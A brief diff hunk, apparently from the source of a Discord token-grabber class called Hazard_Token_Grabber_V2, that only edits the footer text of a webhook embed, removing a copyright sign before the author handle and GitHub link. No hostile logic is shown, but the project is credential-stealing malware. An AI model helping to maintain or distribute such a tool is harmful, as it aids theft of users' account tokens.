@@ -330,7 +330,7 @@ class Hazard_Token_Grabber_V2:
                     },       
 
                     "footer": {
-                      "text": "©Rdimo#6969 https://github.com/Rdimo/Hazard-Token-Grabber-V2"
+                      "text": "Rdimo#6969 https://github.com/Rdimo/Hazard-Token-Grabber-V2"
                     }
                 }
             ]
